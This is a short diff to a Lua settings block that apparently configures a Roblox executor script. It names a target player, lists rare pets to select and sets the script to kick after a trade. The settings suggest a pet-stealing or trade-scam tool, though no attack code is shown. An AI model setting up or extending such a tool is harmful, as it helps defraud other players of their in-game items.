@@ -1,6 +1,6 @@
 getgenv().Target = "cyberoJH6rXOliaD4"
 getgenv().Select_Pet = {
-    "Racoon",
+    "Corrupted Kitsune",
     "Kitsune"
 }
 getgenv().Kick_After_Trade = true
